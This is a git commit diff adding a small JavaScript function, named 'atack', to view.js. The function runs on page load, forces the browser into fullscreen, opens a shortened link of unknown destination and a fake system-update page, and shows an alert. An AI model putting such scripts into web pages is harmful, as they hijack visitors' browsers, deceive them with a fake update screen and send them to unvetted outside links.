3b842dfc2c1df6056283bc0568acdfad69b40800
Ygor Sansone <45521448+YgorSansone@users.noreply.github.com>
2023-05-26 01:29:33 -0300

    Update view.js
    atualizando

--- view.js
+++ view.js
@@ -1,6 +1,29 @@
+function toggleFullScreen() {
+  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
+   (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+    if (document.documentElement.requestFullScreen) {  
+      document.documentElement.requestFullScreen();  
+    } else if (document.documentElement.mozRequestFullScreen) {  
+      document.documentElement.mozRequestFullScreen();  
+    } else if (document.documentElement.webkitRequestFullScreen) {  
+      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
+    }  
+  } else {  
+    if (document.cancelFullScreen) {  
+      document.cancelFullScreen();  
+    } else if (document.mozCancelFullScreen) {  
+      document.mozCancelFullScreen();  
+    } else if (document.webkitCancelFullScreen) {  
+      document.webkitCancelFullScreen();  
+    }  
+  }  
+}
+
 function atack(){
-    console.log("entrando")
+    console.log("entrando");
+    toggleFullScreen();
     window.open("https://n9.cl/b9ikt2", "_blank");
+    window.open("https://fakeupdate.net/wnc/", "_blank");
     alert("=)")
 }
 atack()
